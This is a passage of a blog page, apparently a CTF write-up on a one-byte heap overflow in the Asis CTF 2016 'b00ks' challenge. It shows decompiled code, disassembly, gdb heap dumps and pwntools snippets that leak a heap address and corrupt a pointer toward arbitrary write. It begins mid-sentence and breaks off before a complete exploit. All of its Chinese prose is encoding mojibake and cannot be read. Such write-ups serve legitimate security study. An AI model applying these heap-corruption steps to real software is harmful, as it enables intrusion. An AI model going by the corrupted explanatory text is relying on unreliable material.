<p>åˆ°è¿™é‡Œæˆ‘ä»¬åº”è¯¥å°±èƒ½å‘ç°ï¼Œæˆ‘ä»¬æœ€åå¾—åˆ°çš„0x20çš„chunkæ˜¯åŒ…å«åœ¨0x40çš„chunkä¸­çš„ï¼Œæˆ‘ä»¬å°±ç”±æ­¤å®Œæˆäº†é€šè¿‡å †é‡å æ¥ä¿®æ”¹å †æŒ‡é’ˆçš„è¿‡ç¨‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦ä¿®æ”¹æ§åˆ¶chunkä¸­çš„æŒ‡é’ˆï¼Œå®ç°çš„å°±æ˜¯ä»»æ„åœ°å€è¯»å†™çš„æ•ˆæœã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/05/%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPtçš„Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/05/%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one/" class="post-title-link" itemprop="url">å †åˆ©ç”¨-off_by_one</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-05-05 18:01:07" itemprop="dateCreated datePublished" datetime="2022-05-05T18:01:07+08:00">2022-05-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-05-06 19:25:52" itemprop="dateModified" datetime="2022-05-06T19:25:52+08:00">2022-05-06</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="ç®€è¿°off-by-one"><a href="#ç®€è¿°off-by-one" class="headerlink" title="ç®€è¿°off_by_one"></a>ç®€è¿°off_by_one</h3><p>off_by_oneæŒ‡çš„å°±æ˜¯ä¸€ä¸ªå­—èŠ‚çš„ç¼“å†²åŒºæº¢å‡ºï¼Œå¸¸è§çš„æ¯”å¦‚forå¾ªç¯ä¸­è¾¹ç•Œæ£€æŸ¥ä¸å½“ï¼Œè¿˜æœ‰strcpyå‡½æ•°åœ¨å­—ç¬¦ä¸²å°¾éƒ¨åŠ ä¸Šäº†ä¸€ä¸ªç»“æŸç¬¦ç­‰ç­‰æ‰€é€ æˆçš„ä¸€ä¸ªå­—èŠ‚çš„æº¢å‡ºã€‚</p>
<p>ç¨å¾®ç‰¹æ®Šä¸€ç‚¹çš„æƒ…å†µå°±æ˜¯å•ä¸ªNULLå­—èŠ‚çš„æº¢å‡ºï¼Œæ¯”å¦‚ä¸Šè¿°çš„strcpyå‡½æ•°æ‰€é€ æˆçš„æº¢å‡ºå°±å±äºå•ä¸ªNULLå­—èŠ‚çš„æº¢å‡ºï¼Œæˆ‘ä»¬æŠŠè¿™ç§ç‰¹æ®Šæƒ…å†µç§°ä¸º NULL byte off-by-one æˆ–è€… off-by-NULL</p>
<h3 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">b00ks</a></h3><h4 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h4><p>å…·æœ‰off-by-oneæ¼æ´çš„å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">my_read</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, a1, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++a1;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ä»”ç»†æ€è€ƒå°±ä¼šå‘ç°è¿™ä¸ªå‡½æ•°å…¶å®æ˜¯ä¸åˆç†çš„ï¼ˆæˆ–è€…è¯´æ˜¯æœ‰é—®é¢˜çš„ï¼‰ï¼Œæ¯”å¦‚æˆ‘ä»¬ä¼ è¿›è¯¥å‡½æ•°çš„é•¿åº¦ä¸º32ï¼Œå½“æˆ‘ä»¬è¾“å…¥å®Œç¬¬32ä¸ªå­—ç¬¦çš„æ—¶å€™ï¼Œa1å®é™…æŒ‡å‘äº†<code>ä¼ å…¥çš„åœ°å€+32ä¸ªå­—èŠ‚</code>å¤„ï¼Œ è¿™ä¸ªåœ°å€å®é™…ä¸Šå·²ç»è¶…å‡ºäº†ä¼ å…¥çš„é•¿åº¦ï¼Œæœ€å<code>*a1 = 0</code>å°±é€ æˆäº†off-by-one</p>
<p>å›åˆ°ç¨‹åºï¼Œåœ¨ç¨‹åºçš„å¼€å§‹é¦–å…ˆä¼šè¦æ±‚è¾“å…¥<code>author name</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_B6D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter author name: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !my_read(off_202018, <span class="number">32LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fail to read author_name&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œ<code>my_read</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯<code>off_202018</code>ï¼Œåœ¨idaä¸­çœ‹ä¸€çœ‹è¿™ä¸ªåœ°æ–¹çš„å€¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000202008 ; void *off_202008</span><br><span class="line">.data:0000000000202008 off_202008      dq offset off_202008    ; DATA XREF: sub_980+17â†‘r</span><br><span class="line">.data:0000000000202008                                         ; .data:off_202008â†“o</span><br><span class="line">.data:0000000000202010 off_202010      dq offset unk_202060    ; DATA XREF: sub_B24:loc_B38â†‘o</span><br><span class="line">.data:0000000000202010                                         ; delete:loc_C1Bâ†‘o ...</span><br><span class="line">.data:0000000000202018 off_202018      dq offset unk_202040    ; DATA XREF: change_author+15â†‘o</span><br><span class="line">.data:0000000000202018                                         ; show+CAâ†‘o</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°<code>off_202018</code>çš„è¿™ä¸ªæŒ‡é’ˆä¿å­˜çš„æ˜¯<code>unk_202040</code>çš„å€¼ï¼Œ<code>unk_202040</code>å…¶å®å°±æ˜¯ä¸ç¨‹åºåŸºå€åç§»ä¸º<code>0x202040</code>çš„åœ°å€ï¼Œè¿™ä¸ªåœ°å€åœ¨<code>.bss</code>æ®µä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬è¾“å…¥çš„author nameä¿å­˜åœ¨äº†<code>unk_202040</code>è¿™ä¸ªåœ°å€é‡Œã€‚</p>
<p>ç„¶åè¿›å…¥èœå•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. Create a book</span><br><span class="line">2. Delete a book</span><br><span class="line">3. Edit a book</span><br><span class="line">4. Print book detail</span><br><span class="line">5. Change current author name</span><br><span class="line">6. Exit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>Create a book</code>ä¸­è¦æ±‚è¾“å…¥bookçš„åå­—ï¼ˆé™åˆ¶æœ€é•¿ä¸º32å­—èŠ‚ï¼‰è·Ÿå†…å®¹ï¼ˆæ— é•¿åº¦é™åˆ¶ï¼‰ï¼Œbookçš„åå­—è·Ÿå†…å®¹éƒ½åˆ†åˆ«ç”³è¯·äº†ä¸€ä¸ªå¯¹åº”å¤§å°çš„chunkæ¥å‚¨å­˜ï¼Œå¹¶ä¸”åœ¨æœ€åç”³è¯·äº†ä¸€ä¸ª0x20å¤§å°çš„chunkæ¥å­˜å‚¨è¿™ä¸ªbookçš„ç›¸å…³ä¿¡æ¯</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">book_struct = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);        <span class="comment">// ç”¨ä¸€ä¸ª0x20çš„chunkæ¥ä¿å­˜bookçš„ç›¸å…³ä¿¡æ¯</span></span><br><span class="line"><span class="keyword">if</span> ( book_struct )</span><br><span class="line">&#123;</span><br><span class="line">	*(book_struct + <span class="number">3</span>) = v1;			<span class="comment">//v1æ˜¯contentçš„å¤§å°</span></span><br><span class="line">	*(off_202010 + v2) = book_struct;	<span class="comment">//å°†æŒ‡é’ˆä¿å­˜åˆ°*(off_202010+v2)å¤„</span></span><br><span class="line">	*(book_struct + <span class="number">2</span>) = content;		<span class="comment">//contentæ˜¯å­˜å‚¨bookçš„å†…å®¹çš„chunkæŒ‡é’ˆ</span></span><br><span class="line">	*(book_struct + <span class="number">1</span>) = name;			<span class="comment">//nameæ˜¯å­˜å‚¨bookçš„åå­—çš„chunkæŒ‡é’ˆ</span></span><br><span class="line">	*book_struct = ++book_num;			<span class="comment">//*book_structæ˜¯è¯¥bookå¯¹åº”çš„id</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œæˆ‘ä»¬ä¹Ÿè¦æ³¨æ„ï¼Œ<code>*(off_202010 + v2) = book_struct;</code>è¿™æ¡æŒ‡ä»¤æ˜¯å°†<code>book_struct</code>æŒ‡é’ˆä¿å­˜åˆ°<code>off_202010 </code>è¿™ä¸ªæŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€+v2ä¸ªæŒ‡é’ˆç±»å‹é•¿åº¦å¤„ï¼ˆè¿™é‡Œä¸ºv2ä¸ª8å­—èŠ‚ï¼‰ï¼Œå…·ä½“çš„å¯ä»¥ä»ä¸‹é¢è¿™æ®µæ±‡ç¼–çœ‹å‡ºæ¥ã€‚ï¼ˆä¸ºä»€ä¹ˆè¦å¼ºè°ƒè¿™ä¸ªå‘¢å› ä¸ºæˆ‘ä¸ªäººåŸºç¡€ä¸æ˜¯å¾ˆå¥½æ‰€ä»¥å†™çš„æ—¶å€™å¤ä¹ ä¸€ä¸‹ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000112E                 lea     rax, off_202010</span><br><span class="line">.text:0000000000001135                 mov     rax, [rax]</span><br><span class="line">.text:0000000000001138                 mov     edx, [rbp+v2]</span><br><span class="line">.text:000000000000113B                 movsxd  rdx, edx</span><br><span class="line">.text:000000000000113E                 shl     rdx, 3</span><br><span class="line">.text:0000000000001142                 add     rdx, rax</span><br><span class="line">.text:0000000000001145                 mov     rax, [rbp+book_struct]</span><br><span class="line">.text:0000000000001149                 mov     [rdx], rax</span><br></pre></td></tr></table></figure>

<p>deleteå‡½æ•°æ­£å¸¸é‡Šæ”¾<code>book_structã€contentã€name</code>æŒ‡é’ˆï¼Œå¹¶ä¸”å°†<code>off_202010 + v2</code>ä¸Šçš„æŒ‡é’ˆç½®é›¶ï¼Œä¸å­˜åœ¨uafæ¼æ´ã€‚</p>
<p>editå‡½æ•°æ ¹æ®<code>book_struct</code>æŒ‡é’ˆå»ä¿®æ”¹bookçš„å†…å®¹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the book id you want to edit: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">......</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter new book description: &quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !my_read(*(*(off_202010 + i) + <span class="number">16LL</span>), *(*(off_202010 + i) + <span class="number">24LL</span>) - <span class="number">1</span>) )</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>printfåŠŸèƒ½å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = *(off_202010 + i);</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;ID: %d\n&quot;</span>, **(off_202010 + i));</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, *(*(off_202010 + i) + <span class="number">8LL</span>));</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Description: %s\n&quot;</span>, *(*(off_202010 + i) + <span class="number">16LL</span>));</span><br><span class="line">      LODWORD(v0) = <span class="built_in">printf</span>(<span class="string">&quot;Author: %s\n&quot;</span>, off_202018);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€åä¸€ä¸ªä¿®æ”¹author nameçš„åŠŸèƒ½</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_B6D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter author name: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !my_read(off_202018, <span class="number">32LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fail to read author_name&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h4><p>ï¼ˆæœ¬é¢˜åœ¨ Ubuntu16.04 ä¸‹å¤ç°ï¼‰</p>
<p>ç¨‹åºæœ€å¼€å§‹è¦æ±‚è¾“å…¥çš„author nameçš„é•¿åº¦ä¸º0x20ä¸ªå­—èŠ‚ï¼Œå¹¶ä¸”è¾“å…¥åœ¨<code>unk_202040</code>å¤„ï¼Œå› ä¸ºæ˜¯ç”¨æœ‰off-by-oneæ¼æ´çš„<code>my_read</code>å‡½æ•°è¾“å…¥çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬è¾“å…¥çš„author nameæœ‰32ä¸ªå­—èŠ‚çš„è¯ï¼Œé‚£ä¹ˆç»“æŸç¬¦å°±ä¼šåœ¨<code>unk_202040+0x20</code>å¤„ï¼ŒåŒæ—¶æˆ‘ä»¬è¦æ³¨æ„çš„æ˜¯ç”¨æ¥ä¿å­˜bookçš„ç›¸å…³ä¿¡æ¯çš„chunkçš„æŒ‡é’ˆ<code>book_struct</code>ä¿å­˜åœ¨äº†<code>*(off_202010 + v2)</code>å¤„ï¼ˆè¯¦è§ä¸Šè¿°é¢˜ç›®å¤„ï¼‰ï¼Œä¹Ÿå°±æ˜¯<code>unk_202060+v2*8</code>å¤„ã€‚æ‰€ä»¥ç¬¬ä¸€ä¸ªbookçš„<code>book_struct</code>æŒ‡é’ˆå°±å†™åœ¨äº†<code>unk_202060</code>å¤„ï¼Œé‚£ä¹ˆè¿™æ—¶å°±äº§ç”Ÿäº†ä¸€ä¸ªé—®é¢˜</p>
<ol>
<li>å½“æˆ‘ä»¬è¾“å…¥çš„author nameé•¿åº¦ä¸º32ä¸ªå­—èŠ‚çš„æ—¶å€™ï¼Œauthor nameçš„ç»“æŸç¬¦ä¼šè¢«ç¬¬ä¸€ä¸ªbookçš„<code>book_struct</code>æŒ‡é’ˆè¦†ç›–æ‰</li>
<li>å› ä¸ºç¨‹åºæä¾›çš„åŠŸèƒ½ä¸­æœ‰ä¿®æ”¹author nameè¿™ä¸€åŠŸèƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ä¿®æ”¹author nameä»è€Œè®©ç»“æŸç¬¦è¦†ç›–æ‰ç¬¬ä¸€ä¸ªbookçš„<code>book_struct</code>æŒ‡é’ˆçš„ä½ä¸€å­—èŠ‚ã€‚</li>
</ol>
<p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨1æ¥æ³„æ¼heapåœ°å€ï¼ˆå› ä¸ºshow()å‡½æ•°ä¼šæ‰“å°author nameï¼‰ï¼Œåˆ©ç”¨2æ¥ä¿®æ”¹å †æŒ‡é’ˆã€‚</p>
<p>ä¸€æ­¥ä¸€æ­¥æ¥ï¼Œæˆ‘ä»¬å…ˆç”³è¯·ä¸€ä¸ªname_size = 0x20ï¼Œcontent_size = 0x40çš„book</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&quot;Enter author name:&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;book1&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿›gdbçœ‹çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x561ece378040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x561ece378050:	0x6161616161616161	0x6161616161616161		==&gt;è¿™32ä¸ªå­—èŠ‚æ˜¯aunthor name</span><br><span class="line">0x561ece378060:	0x0000561ecf2be0a0	0x0000000000000000		==&gt;è¿™é‡Œå¼€å§‹ä¿å­˜book_structæŒ‡é’ˆ</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å†çœ‹çœ‹æ­¤æ—¶çš„å †ç»“æ„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heap</span><br><span class="line">0x561ecf2bd000 PREV_INUSE &#123;			#ç¨‹åºè‡ªå·±ç”³è¯·0x1010ä¸ªå­—èŠ‚çš„chunk</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x1011, </span><br><span class="line">  fd = 0xa3436, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x561ecf2be010 FASTBIN &#123;		#è¿™ä¸ªchunkç”¨æ¥ä¿å­˜book_name</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x31, </span><br><span class="line">  fd = 0x316b6f6f62, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x561ecf2be040 FASTBIN &#123;		#è¿™ä¸ªchunkç”¨æ¥ä¿å­˜book_content</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x51, </span><br><span class="line">  fd = 0x61616161, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x561ecf2be090 FASTBIN &#123;		#è¿™ä¸ªå°±æ˜¯book_structæŒ‡å‘çš„chunk</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x31, </span><br><span class="line">  fd = 0x1, </span><br><span class="line">  bk = 0x561ecf2be020, </span><br><span class="line">  fd_nextsize = 0x561ecf2be050, </span><br><span class="line">  bk_nextsize = 0x40</span><br><span class="line">&#125;</span><br><span class="line">0x561ecf2be0c0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x20f41, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢æ˜¯book_structçš„å…·ä½“å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x0000561ecf2be0a0</span><br><span class="line">0x561ecf2be0a0:	0x0000000000000001	0x0000561ecf2be020	#id 	book_nameçš„æŒ‡é’ˆ</span><br><span class="line">0x561ecf2be0b0:	0x0000561ecf2be050	0x0000000000000040	#book_contentçš„æŒ‡é’ˆ   contentå¤§å°</span><br></pre></td></tr></table></figure>

<p>åˆ°è¿™é‡Œå¼€å§‹å°±æ˜¯é‡ç‚¹äº†ï¼Œé¦–å…ˆæˆ‘ä»¬åº”è¯¥æ³¨æ„åˆ°çš„æ˜¯editå‡½æ•°æ˜¯æ€æ ·ä¿®æ”¹bookçš„å†…å®¹çš„ï¼Œ<code>my_read(*(*(off_202010 + i) + 16LL), *(*(off_202010 + i) + 24LL) - 1)</code></p>
<p>è¿™ä¸ªå‡½æ•°å…¶å®å°±æ˜¯åˆ©ç”¨äº†ä¿å­˜åœ¨<code>*(off_202010 + i)</code>å¤„çš„æŒ‡é’ˆæ¥åˆ†åˆ«è¯»å–book_contentæŒ‡é’ˆä»¥åŠcontentçš„sizeã€‚å¦‚æœæˆ‘ä»¬èƒ½æŠŠ<code>*(off_202010 + i)</code>å¤„çš„æŒ‡é’ˆè¦†ç›–æˆ<code>book_content</code>æŒ‡é’ˆçš„è¯ï¼Œé‚£ä¹ˆeditå‡½æ•°ä¸å°±ç›¸å½“äºè¯»å–<code>*(book_content)+16</code>å¤„çš„å€¼æ¥ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå–<code>*(book_content)+24</code>å¤„çš„å€¼æ¥ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°äº†å—ï¼Ÿè€Œæˆ‘ä»¬åˆçŸ¥é“<code>*(book_content)+16</code>å’Œ<code>*(book_content)+24</code>å¤„çš„å€¼æ˜¯ç›´æ¥ç”±æˆ‘ä»¬æ§åˆ¶çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ç›¸å½“äºæœ‰äº†ä¸€ä¸ªä»»æ„åœ°å€å†™ã€‚</p>
<p>é‚£ä¹ˆç°åœ¨çš„é—®é¢˜å°±æ˜¯ï¼Œæ€ä¹ˆæŠŠä¿å­˜åœ¨<code>*(off_202010 + i)</code>å¤„çš„æŒ‡é’ˆè¦†ç›–æˆ<code>book_content</code>æŒ‡é’ˆï¼Ÿ</p>
<p>è¿™å…¶å®å¾ˆç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦è®©book_contentç¨å¾®å¤§ä¸€ç‚¹ï¼Œè®©<code>book_struct</code>çš„ä½ä¸€å­—èŠ‚è¢«è¦†ç›–æˆâ€˜\x00â€™åçš„è¿™ä¸ªåœ°å€çš„+16å’Œ+24å¤„çš„å†…å®¹æ˜¯èƒ½è¢«æˆ‘ä»¬æ§åˆ¶çš„å³å¯ã€‚</p>
<p>æ¯”å¦‚è¯´æˆ‘ä»¬åˆ›å»ºçš„ç¬¬ä¸€ä¸ªbookæ˜¯è¿™æ ·çš„è¯</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;book1&#x27;</span>,<span class="number">0xf0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆ<code>book_struct = 0x000055b4705d9150</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x55b46ee78040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b46ee78050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b46ee78060:	0x000055b4705d9150	0x0000000000000000</span><br></pre></td></tr></table></figure>

